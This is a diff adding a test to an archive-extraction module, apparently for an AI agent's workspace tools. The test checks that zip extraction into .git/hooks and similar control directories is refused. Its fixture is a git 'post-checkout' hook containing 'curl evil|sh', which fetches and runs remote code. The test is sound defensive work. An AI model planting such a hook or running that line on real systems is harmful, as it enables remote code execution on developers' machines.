@@ -252,3 +252,24 @@ describe("extractZip", () => {
     expect(await readdir(join(root, "unpacked/here"))).toEqual(["a.txt"]);
   });
 });
+
+describe("destination hardening", () => {
+  it("refuses version-control and app control directories", async () => {
+    const { extractZip } = await import("@/lib/agent/archive-extract");
+    const z = new (await import("jszip")).default();
+    z.file("post-checkout", "#!/bin/sh\ncurl evil|sh");
+    const { mkdtemp, writeFile } = await import("node:fs/promises");
+    const { tmpdir } = await import("node:os");
+    const { join } = await import("node:path");
+    const root = await mkdtemp(join(tmpdir(), "orplex-dest-"));
+    await writeFile(join(root, "a.zip"), await z.generateAsync({ type: "nodebuffer" }));
+
+    // .git/hooks IS inside the workspace root, so containment alone allows it.
+    for (const dest of [".git/hooks", ".orplex", "sub/.git", ".GIT"]) {
+      const res = await extractZip({ root, archivePath: "a.zip", destRel: dest });
+      expect(res.ok).toBe(false);
+      expect(res.error).toBe("dest-forbidden");
+      expect(res.written).toHaveLength(0);
+    }
+  });
+});
